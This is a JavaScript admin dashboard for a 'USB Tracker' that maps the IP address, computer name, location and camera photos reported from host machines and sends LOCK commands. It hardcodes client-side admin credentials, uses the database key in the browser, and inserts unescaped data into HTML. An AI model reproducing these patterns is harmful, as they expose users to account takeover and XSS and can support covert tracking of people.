const ADMIN_USERNAME = "admin";
const ADMIN_PASSWORD = "admin123";

let map;
let fullscreenMap;
let markers = {};
let allLocations = [];
let allDevices = [];
let allPhotos = [];
let refreshInterval;
let imageZoom = 1;
let currentImage = null;
let translateX = 0, translateY = 0;
let isDragging = false;
let startX = 0, startY = 0;
let imageContainer = null;

function adminLogin() {
    const username = document.getElementById('adminUsername').value;
    const password = document.getElementById('adminPassword').value;
    const errorDiv = document.getElementById('loginError');
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        errorDiv.innerHTML = '';
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('dashboardContainer').style.display = 'block';
        addTerminalLog('Admin logged in successfully', 'success');
        initDashboard();
    } else {
        errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Invalid username or password!';
    }
}

function adminLogout() {
    document.getElementById('loginPage').style.display = 'flex';
    document.getElementById('dashboardContainer').style.display = 'none';
    document.getElementById('adminUsername').value = '';
    document.getElementById('adminPassword').value = '';
    addTerminalLog('Admin logged out', 'info');
}

function initDashboard() {
    initMap();
    loadDevices();
    loadLocations();
    loadPhotos();
    startRealTimeUpdates();
    addTerminalLog('System initialized', 'success');
    addTerminalLog('USB Tracker v3.0 - Admin Panel', 'info');
    
    document.getElementById('statDevices').addEventListener('click', () => {
        document.querySelector('.device-section').scrollIntoView({ behavior: 'smooth' });
    });
    document.getElementById('statActive').addEventListener('click', () => {
        const activeDevices = allDevices.filter(d => d.status === 'active');
        if (activeDevices.length === 0) alert('No active devices found.');
        else {
            document.querySelector('.device-section').scrollIntoView({ behavior: 'smooth' });
            addTerminalLog(`Showing ${activeDevices.length} active device(s)`, 'info');
        }
    });
    document.getElementById('statPhotos').addEventListener('click', () => {
        document.querySelector('.tab-btn[data-tab="photos"]').click();
    });
    document.getElementById('statTracks').addEventListener('click', () => {
        document.querySelector('.tab-btn[data-tab="locations"]').click();
    });
}

function initMap() {
    map = L.map('map').setView([24.8607, 67.0011], 12);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors',
        detectRetina: true
    }).addTo(map);
    map.attributionControl.setPrefix('USB Tracker');
}

function createFullscreenMap() {
    if (fullscreenMap) fullscreenMap.remove();
    fullscreenMap = L.map('fullscreenMap').setView(map.getCenter(), map.getZoom());
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors',
        detectRetina: true
    }).addTo(fullscreenMap);
    fullscreenMap.attributionControl.setPrefix('USB Tracker');
    Object.values(markers).forEach(marker => {
        const pos = marker.getLatLng();
        const popupContent = marker.getPopup().getContent();
        const newMarker = L.marker(pos).addTo(fullscreenMap);
        newMarker.bindPopup(popupContent);
    });
}

function openFullscreenMap() {
    const modal = document.getElementById('fullscreenMapModal');
    modal.style.display = 'flex';
    setTimeout(() => createFullscreenMap(), 100);
}

function closeFullscreenMap() {
    const modal = document.getElementById('fullscreenMapModal');
    modal.style.display = 'none';
    if (fullscreenMap) {
        fullscreenMap.remove();
        fullscreenMap = null;
    }
}

function zoomIn() { map.zoomIn(); }
function zoomOut() { map.zoomOut(); }
function resetMapView() { map.setView([24.8607, 67.0011], 12); }

function openFullImage(src) {
    const modal = document.getElementById('imageModal');
    const container = document.getElementById('imageContainer');
    const img = document.getElementById('fullImage');
    if (!modal || !container || !img) return;

    img.src = src;
    img.style.transform = `translate(-50%, -50%) scale(1)`;
    imageZoom = 1;
    currentImage = img;
    imageContainer = container;

    container.removeEventListener('mousedown', onMouseDown);
    container.removeEventListener('mousemove', onMouseMove);
    container.removeEventListener('mouseup', onMouseUp);
    container.addEventListener('mousedown', onMouseDown);
    window.addEventListener('mousemove', onMouseMove);
    window.addEventListener('mouseup', onMouseUp);
    container.removeEventListener('wheel', onWheel);
    container.addEventListener('wheel', onWheel);

    modal.style.display = 'flex';
}

function closeImageModal() {
    const modal = document.getElementById('imageModal');
    if (modal) modal.style.display = 'none';
    if (imageContainer) {
        imageContainer.removeEventListener('mousedown', onMouseDown);
        imageContainer.removeEventListener('wheel', onWheel);
        window.removeEventListener('mousemove', onMouseMove);
        window.removeEventListener('mouseup', onMouseUp);
    }
}

function zoomImage(direction) {
    if (!currentImage) return;
    const step = 0.2;
    let newZoom = imageZoom;
    if (direction === 'in') newZoom = Math.min(imageZoom + step, 3);
    else newZoom = Math.max(imageZoom - step, 0.5);
    if (newZoom === imageZoom) return;
    imageZoom = newZoom;
    updateImageTransform();
}

function resetImageZoom() {
    if (!currentImage) return;
    imageZoom = 1;
    translateX = 0;
    translateY = 0;
    updateImageTransform();
}

function updateImageTransform() {
    if (!currentImage) return;
    currentImage.style.transform = `translate(calc(-50% + ${translateX}px), calc(-50% + ${translateY}px)) scale(${imageZoom})`;
}

function onMouseDown(e) {
    if (imageZoom <= 1) return;
    e.preventDefault();
    isDragging = true;
    startX = e.clientX - translateX;
    startY = e.clientY - translateY;
}

function onMouseMove(e) {
    if (!isDragging) return;
    e.preventDefault();
    translateX = e.clientX - startX;
    translateY = e.clientY - startY;
    updateImageTransform();
}

function onMouseUp() { isDragging = false; }

function onWheel(e) {
    e.preventDefault();
    const delta = e.deltaY > 0 ? -0.1 : 0.1;
    let newZoom = Math.min(Math.max(imageZoom + delta, 0.5), 3);
    if (newZoom === imageZoom) return;
    imageZoom = newZoom;
    updateImageTransform();
}

function startRealTimeUpdates() {
    refreshInterval = setInterval(() => {
        loadDevices();
        loadLocations();
        loadPhotos();
    }, 10000);
}

function refreshData() {
    loadDevices();
    loadLocations();
    loadPhotos();
    addTerminalLog('Manual refresh triggered', 'info');
}

async function loadDevices() {
    try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/devices?select=*&order=created_at.desc`, {
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`
            }
        });
        allDevices = await response.json();
        if (!Array.isArray(allDevices)) allDevices = [];
        updateDeviceList();
        updateStats();
    } catch(error) {
        addTerminalLog(`Error loading devices: ${error.message}`, 'error');
        allDevices = [];
    }
}

async function loadLocations() {
    try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/locations?select=*&order=created_at.desc&limit=100`, {
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`
            }
        });
        allLocations = await response.json();
        if (!Array.isArray(allLocations)) allLocations = [];
        updateLocationList();
        updateMapMarkers();
        updateStats();
        updateAnalytics();
        if (allLocations.length > 0) {
            const latest = allLocations[0];
            addTerminalLog(`New location tracked: ${latest.city}, ${latest.country} | Device: ${latest.device_id}`, 'info');
        }
    } catch(error) {
        addTerminalLog(`Error loading locations: ${error.message}`, 'error');
        allLocations = [];
    }
}

async function loadPhotos() {
    try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/locations?select=camera_image,device_id,created_at&camera_image=not.is.null&order=created_at.desc&limit=50`, {
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`
            }
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        allPhotos = Array.isArray(data) ? data : [];
        updatePhotoGallery();
        updateStats();
    } catch(error) {
        console.error('Error loading photos:', error);
        allPhotos = [];
        addTerminalLog(`Error loading photos: ${error.message}`, 'error');
    }
}

function updateDeviceList() {
    const container = document.getElementById('deviceList');
    if (!container) return;
    container.innerHTML = '';
    if (!allDevices || allDevices.length === 0) {
        container.innerHTML = '<div style="padding: 20px; text-align: center; color: #aaa;"><i class="fas fa-usb"></i> No devices registered</div>';
        return;
    }
    allDevices.forEach(device => {
        const statusClass = device.status === 'active' ? '' : 'offline';
        const lastSeen = device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never';
        const div = document.createElement('div');
        div.className = `device-card ${statusClass}`;
        div.innerHTML = `
            <div class="device-name"><i class="fas fa-usb"></i> ${device.name || device.device_id}</div>
            <div class="device-id"><i class="fas fa-fingerprint"></i> ID: ${device.device_id} | Owner: ${device.owner || 'Unknown'}</div>
            <div class="device-id"><i class="fas fa-clock"></i> Last seen: ${lastSeen}</div>
            <div class="device-actions">
                <button class="lock-btn" onclick="sendCommand('${device.device_id}', 'LOCK')"><i class="fas fa-lock"></i> LOCK</button>
                <button class="delete-btn" onclick="deleteDevice('${device.device_id}')"><i class="fas fa-trash"></i> REMOVE</button>
            </div>
        `;
        div.onclick = (e) => {
            if (e.target.classList.contains('lock-btn') || e.target.classList.contains('delete-btn')) return;
            focusDevice(device.device_id);
        };
        container.appendChild(div);
    });
}

function updateLocationList() {
    const container = document.getElementById('locationList');
    if (!container) return;
    const searchTerm = document.getElementById('searchLocation')?.value?.toLowerCase() || '';
    let filtered = Array.isArray(allLocations) ? allLocations : [];
    if (searchTerm) {
        filtered = filtered.filter(loc =>
            (loc.device_id && loc.device_id.toLowerCase().includes(searchTerm)) ||
            (loc.city && loc.city.toLowerCase().includes(searchTerm))
        );
    }
    container.innerHTML = '';
    if (filtered.length === 0) {
        container.innerHTML = '<div style="padding: 40px; text-align: center; color: #aaa;"><i class="fas fa-map-marker-alt"></i> No location records found</div>';
        return;
    }
    filtered.slice(0, 50).forEach(loc => {
        const div = document.createElement('div');
        div.className = 'location-item';
        div.innerHTML = `
            <div class="time"><i class="far fa-calendar-alt"></i> ${new Date(loc.created_at).toLocaleString()}</div>
            <div><i class="fas fa-usb"></i> <strong>Device:</strong> ${loc.device_id || 'Unknown'}</div>
            <div><i class="fas fa-map-marker-alt"></i> <strong>Location:</strong> ${loc.city || 'Unknown'}, ${loc.country || 'Unknown'}</div>
            <div><i class="fas fa-network-wired"></i> <strong>IP:</strong> ${loc.ip_address || 'N/A'}</div>
            <div><i class="fas fa-laptop"></i> <strong>Computer:</strong> ${loc.computer_name || 'N/A'}</div>
            <div><i class="fas fa-battery-full"></i> <strong>Battery:</strong> ${loc.battery || 'N/A'}%</div>
            <button class="delete-btn" style="margin-top: 8px;" onclick="deleteLocation('${loc.device_id}', '${loc.created_at}')"><i class="fas fa-trash"></i> Delete</button>
        `;
        div.addEventListener('click', (e) => {
            if (e.target.classList.contains('delete-btn')) return;
            focusDevice(loc.device_id);
        });
        container.appendChild(div);
    });
}

function updatePhotoGallery() {
    const container = document.getElementById('photoGallery');
    if (!container) return;
    const searchTerm = document.getElementById('searchPhoto')?.value?.toLowerCase() || '';
    let filtered = Array.isArray(allPhotos) ? allPhotos.filter(p => p.camera_image && p.camera_image !== '') : [];
    if (searchTerm) {
        filtered = filtered.filter(p => p.device_id && p.device_id.toLowerCase().includes(searchTerm));
    }
    container.innerHTML = '';
    if (filtered.length === 0) {
        container.innerHTML = '<div style="padding: 40px; text-align: center; color: #aaa;"><i class="fas fa-camera"></i> No photos captured yet</div>';
        return;
    }
    filtered.forEach(photo => {
        const card = document.createElement('div');
        card.className = 'photo-card';
        const imageDiv = document.createElement('div');
        imageDiv.className = 'photo-image';
        const img = document.createElement('img');
        img.src = photo.camera_image;
        img.alt = 'Camera photo';
        img.onclick = (e) => {
            e.stopPropagation();
            openFullImage(photo.camera_image);
        };
        imageDiv.appendChild(img);
        const infoDiv = document.createElement('div');
        infoDiv.className = 'photo-info';
        const deviceSpan = document.createElement('span');
        deviceSpan.className = 'photo-device';
        deviceSpan.innerHTML = `<i class="fas fa-usb"></i> ${photo.device_id || 'Unknown'}`;
        const timeSpan = document.createElement('span');
        timeSpan.className = 'photo-time';
        const date = photo.created_at ? new Date(photo.created_at) : new Date();
        timeSpan.textContent = date.toLocaleString();
        infoDiv.appendChild(deviceSpan);
        infoDiv.appendChild(timeSpan);
        const deleteBtn = document.createElement('button');
        deleteBtn.className = 'photo-delete';
        deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
        deleteBtn.onclick = (e) => {
            e.stopPropagation();
            deletePhoto(photo.device_id, photo.created_at);
        };
        card.appendChild(imageDiv);
        card.appendChild(infoDiv);
        card.appendChild(deleteBtn);
        container.appendChild(card);
    });
}

function updateMapMarkers() {
    if (!map) return;
    Object.values(markers).forEach(marker => { if (map.hasLayer(marker)) map.removeLayer(marker); });
    markers = {};
    const locations = Array.isArray(allLocations) ? allLocations : [];
    const latestPerDevice = {};
    locations.forEach(loc => {
        if (!latestPerDevice[loc.device_id] || new Date(loc.created_at) > new Date(latestPerDevice[loc.device_id].created_at)) {
            latestPerDevice[loc.device_id] = loc;
        }
    });
    Object.values(latestPerDevice).forEach(loc => {
        if (loc.latitude && loc.longitude && loc.latitude !== 0 && loc.longitude !== 0) {
            const purpleIcon = L.divIcon({
                className: 'custom-marker',
                html: '<div style="background: #9c50ff; width: 12px; height: 12px; border-radius: 50%; box-shadow: 0 0 10px #9c50ff; border: 2px solid white;"></div>',
                iconSize: [12, 12],
                popupAnchor: [0, -6]
            });
            const marker = L.marker([loc.latitude, loc.longitude], { icon: purpleIcon }).addTo(map);
            marker.bindPopup(`
                <div style="font-family: Poppins, sans-serif;">
                    <b><i class="fas fa-usb"></i> ${loc.device_id || 'Unknown'}</b><br>
                    <i class="fas fa-map-marker-alt"></i> ${loc.city || 'Unknown'}, ${loc.country || 'Unknown'}<br>
                    <i class="fas fa-network-wired"></i> IP: ${loc.ip_address || 'N/A'}<br>
                    <i class="fas fa-laptop"></i> Computer: ${loc.computer_name || 'N/A'}<br>
                    <i class="far fa-clock"></i> ${new Date(loc.created_at).toLocaleString()}
                </div>
            `);
            markers[loc.device_id] = marker;
        }
    });
}

function updateStats() {
    const devices = Array.isArray(allDevices) ? allDevices : [];
    const locations = Array.isArray(allLocations) ? allLocations : [];
    const photos = Array.isArray(allPhotos) ? allPhotos.filter(p => p.camera_image && p.camera_image !== '') : [];
    const activeDevices = devices.filter(d => d.status === 'active').length;
    const uniqueLocations = new Set(locations.map(l => `${l.latitude},${l.longitude}`)).size;
    document.getElementById('totalDevices').innerHTML = devices.length;
    document.getElementById('activeDevices').innerHTML = activeDevices;
    document.getElementById('totalLocations').innerHTML = uniqueLocations;
    document.getElementById('totalPhotos').innerHTML = photos.length;
}

function updateAnalytics() {
    const locations = Array.isArray(allLocations) ? allLocations : [];
    const photos = Array.isArray(allPhotos) ? allPhotos : [];
    const locationCount = {};
    locations.forEach(loc => {
        const key = `${loc.city}, ${loc.country}`;
        if (key !== 'Unknown, Unknown') locationCount[key] = (locationCount[key] || 0) + 1;
    });
    const topLocations = Object.entries(locationCount).sort((a,b) => b[1]-a[1]).slice(0,5);
    const topLocDiv = document.getElementById('topLocations');
    if (topLocDiv) {
        if (topLocations.length === 0) topLocDiv.innerHTML = '<div style="color: #aaa;"><i class="fas fa-chart-line"></i> No location data yet</div>';
        else {
            topLocDiv.innerHTML = topLocations.map(([loc, count]) =>
                `<div style="margin: 8px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-map-pin"></i> ${loc}</span><span style="color: #9c50ff;">${count} tracks</span></div>`
            ).join('');
        }
    }
    const today = new Date().toDateString();
    const todayTracks = locations.filter(l => new Date(l.created_at).toDateString() === today).length;
    const dailyDiv = document.getElementById('dailyStats');
    if (dailyDiv) {
        dailyDiv.innerHTML = `
            <div style="margin: 10px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-calendar-day"></i> Today:</span><span style="color: #9c50ff;">${todayTracks} tracks</span></div>
            <div style="margin: 10px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-chart-bar"></i> Total:</span><span style="color: #9c50ff;">${locations.length} tracks</span></div>
            <div style="margin: 10px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-camera"></i> Photos:</span><span style="color: #9c50ff;">${photos.filter(p => p.camera_image).length}</span></div>
        `;
    }
    const activityDiv = document.getElementById('activityOverview');
    if (activityDiv) {
        const last7Days = locations.filter(l => (Date.now() - new Date(l.created_at)) / (1000*60*60*24) <= 7).length;
        activityDiv.innerHTML = `
            <div style="margin: 10px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-chart-line"></i> Last 7 Days:</span><span style="color: #9c50ff;">${last7Days} activities</span></div>
            <div style="margin: 10px 0; display: flex; justify-content: space-between;"><span><i class="fas fa-usb"></i> Active Devices:</span><span style="color: #9c50ff;">${allDevices.filter(d => d.status === 'active').length}</span></div>
        `;
    }
}

function exportData(format) {
    if (!allLocations || allLocations.length === 0) {
        alert('No data to export!');
        return;
    }
    let csvContent = "ID,Device ID,Latitude,Longitude,City,Country,IP Address,Computer Name,OS Info,Battery,Created At\n";
    allLocations.forEach(loc => {
        csvContent += `${loc.id || ''},${loc.device_id || ''},${loc.latitude || ''},${loc.longitude || ''},${loc.city || ''},${loc.country || ''},${loc.ip_address || ''},${loc.computer_name || ''},${loc.os_info || ''},${loc.battery || ''},${loc.created_at || ''}\n`;
    });
    const blob = new Blob([csvContent], { type: format === 'csv' ? 'text/csv;charset=utf-8;' : 'application/vnd.ms-excel' });
    const link = document.createElement('a');
    const url = URL.createObjectURL(blob);
    link.href = url;
    link.setAttribute('download', `usb_tracker_data_${new Date().toISOString().slice(0,19)}.${format === 'csv' ? 'csv' : 'xls'}`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    addTerminalLog(`Data exported as ${format.toUpperCase()}`, 'success');
}

async function deleteLocation(deviceId, createdAt) {
    if (confirm('Delete this location record?')) {
        try {
            const encodedTime = encodeURIComponent(createdAt);
            await fetch(`${SUPABASE_URL}/rest/v1/locations?device_id=eq.${deviceId}&created_at=eq.${encodedTime}`, {
                method: 'DELETE',
                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` }
            });
            loadLocations();
            addTerminalLog('Location record deleted', 'warning');
        } catch(error) {
            addTerminalLog(`Error deleting location: ${error.message}`, 'error');
        }
    }
}

async function deletePhoto(deviceId, createdAt) {
    if (confirm('Delete this photo?')) {
        try {
            const encodedTime = encodeURIComponent(createdAt);
            await fetch(`${SUPABASE_URL}/rest/v1/locations?device_id=eq.${deviceId}&created_at=eq.${encodedTime}`, {
                method: 'PATCH',
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ camera_image: '' })
            });
            loadPhotos();
            addTerminalLog('Photo deleted', 'warning');
        } catch(error) {
            addTerminalLog(`Error deleting photo: ${error.message}`, 'error');
        }
    }
}

async function deleteAllPhotos() {
    if (confirm('⚠️ DELETE ALL PHOTOS? This action cannot be undone!')) {
        try {
            await fetch(`${SUPABASE_URL}/rest/v1/locations?not.camera_image=is.null`, {
                method: 'PATCH',
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ camera_image: '' })
            });
            loadPhotos();
            addTerminalLog('All photos deleted', 'warning');
        } catch(error) {
            addTerminalLog(`Error deleting photos: ${error.message}`, 'error');
        }
    }
}

async function clearHistory() {
    if (confirm('⚠️ DELETE ALL LOCATION HISTORY? This cannot be undone!')) {
        try {
            await fetch(`${SUPABASE_URL}/rest/v1/locations?id=not.is.null`, {
                method: 'DELETE',
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`
                }
            });
            await loadLocations();
            await loadPhotos();
            addTerminalLog('All location history cleared', 'warning');
        } catch(error) {
            addTerminalLog(`Error clearing history: ${error.message}`, 'error');
        }
    }
}

function clearAllMarkers() {
    if (!map) return;
    Object.values(markers).forEach(marker => { if (map.hasLayer(marker)) map.removeLayer(marker); });
    markers = {};
    addTerminalLog('All map markers cleared', 'info');
}

async function saveDevice() {
    const deviceId = document.getElementById('deviceId').value;
    const deviceName = document.getElementById('deviceName').value;
    const ownerName = document.getElementById('ownerName').value;
    if (!deviceId) { alert('Device ID required!'); return; }
    try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/devices`, {
            method: 'POST',
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                device_id: deviceId,
                name: deviceName || deviceId,
                owner: ownerName || 'Unknown',
                status: 'inactive'
            })
        });
        if (response.ok) {
            addTerminalLog(`Device ${deviceName} enrolled successfully`, 'success');
            closeModal();
            loadDevices();
        }
    } catch(error) {
        addTerminalLog(`Error adding device: ${error.message}`, 'error');
    }
}

async function deleteDevice(deviceId) {
    if (confirm(`Delete device ${deviceId}? All data will be lost!`)) {
        try {
            await fetch(`${SUPABASE_URL}/rest/v1/devices?device_id=eq.${deviceId}`, {
                method: 'DELETE',
                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` }
            });
            loadDevices();
            addTerminalLog(`Device ${deviceId} deleted`, 'warning');
        } catch(error) {
            addTerminalLog(`Error deleting device: ${error.message}`, 'error');
        }
    }
}

async function sendCommand(deviceId, command) {
    try {
        await fetch(`${SUPABASE_URL}/rest/v1/commands`, {
            method: 'POST',
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ device_id: deviceId, command: command, status: 'pending' })
        });
        addTerminalLog(`Command ${command} sent to ${deviceId}`, 'info');
        alert(`Command ${command} sent to ${deviceId}`);
    } catch(error) {
        addTerminalLog(`Error sending command: ${error.message}`, 'error');
    }
}

function focusDevice(deviceId) {
    const locations = Array.isArray(allLocations) ? allLocations : [];
    const latestLoc = locations.find(l => l.device_id === deviceId);
    if (latestLoc && latestLoc.latitude && latestLoc.longitude && map) {
        map.setView([latestLoc.latitude, latestLoc.longitude], 15);
        addTerminalLog(`Focusing on device: ${deviceId}`, 'info');
    }
}

function addTerminalLog(message, type = 'info') {
    const terminal = document.getElementById('terminalLog');
    if (!terminal) return;
    const time = new Date().toLocaleTimeString();
    const colors = { success: '#9c50ff', error: '#ff6b9d', warning: '#ffaa44', info: '#9c50ff' };
    const line = document.createElement('div');
    line.className = 'terminal-line';
    line.style.borderLeftColor = colors[type] || colors.info;
    line.innerHTML = `<span style="color: #666;">[${time}]</span> <span style="color: ${colors[type]}">> ${message}</span>`;
    terminal.appendChild(line);
    terminal.scrollTop = terminal.scrollHeight;
    while (terminal.children.length > 50) terminal.removeChild(terminal.firstChild);
}

function openAddDeviceModal() { document.getElementById('addModal').style.display = 'flex'; }
function closeModal() {
    document.getElementById('addModal').style.display = 'none';
    document.getElementById('deviceId').value = '';
    document.getElementById('deviceName').value = '';
    document.getElementById('ownerName').value = '';
}

document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        btn.classList.add('active');
        const tabId = btn.getAttribute('data-tab');
        document.getElementById(`${tabId}Tab`).classList.add('active');
    });
});

const searchLocation = document.getElementById('searchLocation');
if (searchLocation) searchLocation.addEventListener('input', () => updateLocationList());
const searchPhoto = document.getElementById('searchPhoto');
if (searchPhoto) searchPhoto.addEventListener('input', () => updatePhotoGallery());

window.adminLogin = adminLogin;
window.adminLogout = adminLogout;
window.deleteLocation = deleteLocation;
window.deletePhoto = deletePhoto;
window.deleteAllPhotos = deleteAllPhotos;
window.clearHistory = clearHistory;
window.clearAllMarkers = clearAllMarkers;
window.saveDevice = saveDevice;
window.deleteDevice = deleteDevice;
window.sendCommand = sendCommand;
window.openAddDeviceModal = openAddDeviceModal;
window.closeModal = closeModal;
window.openFullImage = openFullImage;
window.closeImageModal = closeImageModal;
window.refreshData = refreshData;
window.focusDevice = focusDevice;
window.zoomIn = zoomIn;
window.zoomOut = zoomOut;
window.resetMapView = resetMapView;
window.zoomImage = zoomImage;
window.resetImageZoom = resetImageZoom;
window.openFullscreenMap = openFullscreenMap;
window.closeFullscreenMap = closeFullscreenMap;
window.exportData = exportData;